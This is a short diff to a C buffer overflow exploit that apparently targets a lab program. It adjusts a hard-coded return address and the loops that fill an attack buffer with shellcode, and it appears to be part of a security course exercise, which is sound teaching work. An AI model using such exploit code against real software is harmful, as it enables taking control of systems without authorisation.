@@ -6,7 +6,7 @@
 
 #define TARGET "../targets/target1"
 #define BUFSIZE 125
-#define TARGET_RA_ADDR 0x202dfe10
+#define TARGET_RA_ADDR 0x202dfeb0
 #define SHELL_LENGTH 45
 
 int
@@ -17,10 +17,10 @@ main ( int argc, char * argv[] )
 	char attack_buffer[BUFSIZE];
 	int *p;
 
-	for(int i = 0; i< BUFSIZE;i++)
+	for(int i = 0; i < BUFSIZE;i++)
 		attack_buffer[i] = 0x04;
 	
-	for(int i = 0; i< SHELL_LENGTH;i++)
+	for(int i = 0; i < SHELL_LENGTH;i++)
 		attack_buffer[i] = shellcode[i];
 	
 	for(int i = 45 ; i < 120; i++)
